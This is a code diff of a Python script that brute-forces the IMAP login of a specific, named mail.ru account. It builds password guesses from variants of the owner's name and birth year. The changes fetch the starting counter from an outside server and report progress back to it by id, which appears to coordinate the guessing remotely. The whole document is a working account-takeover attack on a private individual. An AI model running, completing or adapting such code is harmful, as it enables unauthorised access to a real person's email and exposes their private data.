@@ -6,7 +6,16 @@ import os,requests
 
 found = set()
 pooll = set()
-vase = 4100000
+
+for n in range(10):
+    spns = False
+    try :
+        spns = requests.get("https://ziguas.pserver.ru/bcon/mail_blo/text.txt", timeout=60).text
+    except:
+        pass
+    if spns:
+        break
+vase = int(spns.strip())
 def bcdechex(dec):  
     keyspace = ["GuwanchmyratOrazow", "Guwanchmyrat", "Orazow", "Myrat", "Guwanch", "Guwanc", "Murat", "Orazov", "Guvanch", "Guvanc", "GuvanchmyratOrazow", "Guvanchmyrat", "GuvanchmyratOrazov", "guwanchmyratOrazow", "guwanchmyrat", "orazow", "myrat", "guwanch", "guwanc", "murat", "orazov", "guvanch", "guvanc", "guvanchmyratOrazow", "guvanchmyrat", "guvanchmyratOrazov", "Kwanch", "Kwanc", "Kvanch", "Kvanc", "kwanch", "kwanc", "kvanch", "kvanc", "1993", "93", "0", "1", "2", "3", "4", "5", "6", "7", "8", "9", "-", "_"] #"0123456789-_charydinyewvmCHARYDINYEWVM"
     hexin = ''
@@ -20,18 +29,20 @@ def bcdechex(dec):
 def fill_pooll(no):
     global pooll
     global vase
-    with open("last", "w") as myfile:
-        myfile.write(str(vase))
+    try :
+        spns = requests.get("https://ziguas.pserver.ru/bcon/mail_blo/?id="+str(vase), timeout=60)
+    except:
+        pass
     for x in range(no):
         line = bcdechex(vase)
-        pooll.add(line)
+        #pooll.add(line)
         vase += 1
         
 def checkin(c):
     global pooll
     global found
-    password = random.sample(pooll, 1)[0]
     try : 
+        password = random.sample(pooll, 1)[0]
         server = imapclient.IMAPClient("imap.mail.ru", port=993, use_uid=True, ssl=True, timeout=20)
         server.login("orazow_1993@mail.ru", password)
         print(" +++ Password found  : %s ", password ) 
@@ -47,6 +58,9 @@ def checkin(c):
         pass
     except socket.gaierror:
         pass
+    except ValueError:
+        print("pool empty")
+        pass
 
 while len(found)<1:
     if len(pooll) == 0:
@@ -57,7 +71,7 @@ while len(found)<1:
 
 
 while True:
-    if threading.active_count() == 1:
+    if 2 > threading.active_count():
         print("Found")
         print(found)
         try:
